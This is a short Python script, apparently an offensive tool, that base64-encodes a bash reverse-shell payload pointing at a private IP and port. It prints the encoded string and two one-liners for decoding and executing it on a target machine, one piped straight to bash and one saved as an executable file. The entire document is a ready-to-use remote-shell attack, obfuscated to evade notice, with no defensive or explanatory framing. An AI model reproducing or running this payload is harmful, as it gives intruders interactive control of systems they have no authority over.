import base64

# Reverse shell payload (change IP and port)
reverse_shell = "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"

# Encode the payload
encoded = base64.b64encode(reverse_shell.encode())

print("=" * 50)
print("Payload Encoder - Reverse Shell")
print("=" * 50)
print(f"\nOriginal payload:\n{reverse_shell}\n")
print(f"Encoded (bytes):\n{encoded}\n")
print(f"Encoded (string):\n{encoded.decode()}\n")

print("=" * 50)
print("How to execute on target:")
print("=" * 50)
print(f"echo {encoded.decode()} | base64 -d | bash")
print("\nOr save to file:")
print(f"echo {encoded.decode()} | base64 -d > payload.sh && chmod +x payload.sh && ./payload.sh")
